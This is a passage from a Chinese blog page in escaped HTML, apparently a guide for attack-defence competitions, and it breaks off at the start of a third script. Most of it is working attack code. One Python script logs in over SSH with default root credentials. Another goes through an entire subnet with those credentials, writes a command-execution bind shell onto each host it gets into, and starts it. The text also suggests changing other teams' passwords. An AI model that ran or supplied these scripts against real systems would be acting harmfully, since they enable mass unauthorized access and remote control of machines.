class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;后台的登录密码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-ASN.1&#34; data-language=&#34;ASN.1&#34;&gt;&lt;code class=&#34;language-ASN.1&#34;&gt;updata admin set user pass&amp;#x3D;’123456’;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;如果密码是默认的尝试别人的能否登录&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#-*- coding:utf-8 -*-&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; paramiko

ip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;192.168.1.137&#39;&lt;/span&gt;
port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;22&#39;&lt;/span&gt;
username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;root&#39;&lt;/span&gt;
passwd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;toor&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# ssh 用户名 密码 登陆&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ssh_base_pwd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;cmd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ls&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    ssh &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SSHClient&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;set_missing_host_key_policy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AutoAddPolicy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;connect&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hostname&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    stdin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;stderr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exec_command&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cmd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; result &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;无结果!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; stderr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; result&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ssh_base_pwd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;如果可以登录而且有 python 环境可以尝试使用下面这个 python 批量 ssh 登录并反弹 python shell&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#-*- coding:utf-8 -*-&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; paramiko
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; threading
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; queue
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time
&lt;span class=&#34;token comment&#34;&gt;#反弹 shell python&lt;/span&gt;

q&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;queue&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Queue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#lock = threading.Lock()&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# ssh 用户名 密码 登陆&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ssh_base_pwd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;cmd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    ssh &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SSHClient&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;set_missing_host_key_policy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AutoAddPolicy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;connect&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hostname&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    stdin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;stderr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exec_command&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cmd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; result &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; stderr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; result&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    shell &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
    #服务器端
    import socket
    import os
    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    s.bind((&#39;0.0.0.0&#39;,1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接
    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量
    con,addr=s.accept()     #接受一个客户端的连接
    #print(con,addr)

    for i in range(10):
        cmd=con.recv(1024)
        print(cmd)
        command=cmd.decode()
        if command.startswith(&#39;cd&#39;):
            os.chdir(command[2:].strip())   #切换路径
            result=os.getcwd()      #显示路径
        else:
            result=os.popen(command).read()
        if result:
            con.send(result.encode())
        else:
            con.send(b&#39;OK!&#39;)
    &#39;&#39;&#39;&lt;/span&gt;
    cmd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;echo \&#34;%s\&#34; &gt; ./shell.py&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;shell&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;amp;&amp;amp; python3 ./shell.py&#39;&lt;/span&gt;
    port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;22&#39;&lt;/span&gt;
    username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;root&#39;&lt;/span&gt;
    passwd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;toor&#39;&lt;/span&gt;
    
    ip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;192.168.1.&amp;#123;&amp;#125;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    q&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;put&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;block&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    ip_demo&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#判断是否成功&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#lock.acquire()&lt;/span&gt;
        res &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ssh_base_pwd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip_demo&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;cmd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;id&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; res&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;[ + ]Ip: %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ip_demo &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; is success!!! [ + ]&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;token comment&#34;&gt;#lock.release()&lt;/span&gt;
            ssh_base_pwd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip_demo&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;cmd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;[ - ]Ip: %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ip_demo &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; is Failed&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Finshed!!!!!!!!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    q&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;task_done&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
&lt;span class=&#34;token comment&#34;&gt;#线程队列部分&lt;/span&gt;
th&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
th_num&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;th_num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        t&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;threading&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Thread&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;target&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;args&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        th&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;th_num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        th&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;start&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;th_num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        th&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        

&lt;span class=&#34;token comment&#34;&gt;#q.join () 所有任务完成&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;我们改密码是为了防止被别人弱口令爆破，或者密码是默认的情况导致服务器丢失，这里我们也可以尝试去更改别人的密码&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; paramiko
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys

ssh_clients &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
